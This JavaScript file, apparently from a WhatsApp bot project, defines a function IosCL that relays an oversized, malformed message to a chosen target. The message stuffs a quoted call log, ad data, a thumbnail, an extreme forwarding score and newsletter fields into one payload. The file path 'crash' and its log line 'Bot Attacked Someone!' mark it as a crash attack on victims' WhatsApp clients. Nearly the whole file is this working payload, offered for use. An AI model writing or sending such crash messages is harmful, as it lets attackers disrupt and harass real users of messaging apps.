// ./data/crash/chrisios.js
const chalk = require('chalk');
const { proto } = require('@joanimi/baileys'); // <--- ADD THIS LINE (or other baileys imports needed by functions in this file)
// Note: IosCL does not directly use 'generateWAMessageFromContent', but it does use 'proto'.

async function IosCL(zLoc, LordVoltage, ptcp = false) {
    try {
        await LordVoltage.relayMessage(zLoc, {
            "extendedTextMessage": {
                "text": " Hello This Is LITE 𝐕5⃟⃟⃟🤫 ",
                "contextInfo": {
                    "stanzaId": "1234567890ABCDEF",
                    "participant": "0@s.whatsapp.net",
                    "quotedMessage": {
                        "callLogMesssage": {
                            "isVideo": true,
                            "callOutcome": "1",
                            "durationSecs": "0",
                            "callType": "REGULAR",
                            "participants": [{
                                "jid": "0@s.whatsapp.net",
                                "callOutcome": "1"
                            }]
                        }
                    },
                    "remoteJid": zLoc,
                    "conversionSource": "source_example",
                    "conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                    "conversionDelaySeconds": 10,
                    "forwardingScore": 9999999,
                    "isForwarded": true,
                    "quotedAd": {
                        "advertiserName": "Example Advertiser",
                        "mediaType": "IMAGE",
                        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeBepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                        "caption": "This is an ad caption"
                    },
                    "placeholderKey": {
                        "remoteJid": "6281991410940@s.whatsapp.net",
                        "fromMe": false,
                        "id": "ABCDEF1234567890"
                    },
                    "expiration": 86400,
                    "ephemeralSettingTimestamp": "1728090592378",
                    "ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                    "externalAdReply": {
                        "title": "Hello ",
                        "body": " 🌷 LITE 𝐕5⃟⃟⃟😈 Is Here ϟ",
                        "mediaType": "VIDEO",
                        "renderLargerThumbnail": true,
                        "previewTtpe": "VIDEO",
                        "thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeBepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                        "sourceType": " x ",
                        "sourceId": " x ",
                        "sourceUrl": " p ",
                        "mediaUrl": " p ",
                        "containsAutoReply": true,
                        "renderLargerThumbnail": true,
                        "showAdAttribution": true,
                        "ctwaClid": "ctwa_clid_example",
                        "ref": "ref_example"
                    },
                    "entryPointConversionSource": "entry_point_source_example",
                    "entryPointConversionApp": "entry_point_app_example",
                    "entryPointConversionDelaySeconds": 5,
                    "disappearingMode": {},
                    "actionLink": {
                        "url": " p "
                    },
                    "groupSubject": "Example Group Subject",
                    "parentGroupJid": "6287888888888-1234567890@g.us",
                    "trustBannerType": "trust_banner_example",
                    "trustBannerAction": 1,
                    "isSampled": false,
                    "utm": {
                        "utmSource": "utm_source_example",
                        "utmCampaign": "utm_campaign_example"
                    },
                    "forwardedNewsletterMessageInfo": {
                        "newsletterJid": "6287888888888-1234567890@g.us",
                        "serverMessageId": 1,
                        "newsletterName": " X ",
                        "contentType": "UPDATE",
                        "accessibilityText": " X "
                    },
                    "businessMessageForwardInfo": {
                        "businessOwnerJid": "0@s.whatsapp.net"
                    },
                    "smbClientCampaignId": "smb_client_campaign_id_example",
                    "smbServerCampaignId": "smb_server_campaign_id_example",
                    "dataSharingContext": {
                        "showMmDisclosure": true
                    }
                }
            }
        },
        ptcp ? {
            participant: {
                jid: zLoc,
            }
        } : {}
        );
        console.log(chalk.green("LITE 𝐕5⃟⃟⃟🤫 Bot Attacked Someone!"));
    } catch (error) {
        console.error("An error occurred in IosCL (chrisios.js):", error);
    }
};

module.exports = { IosCL };
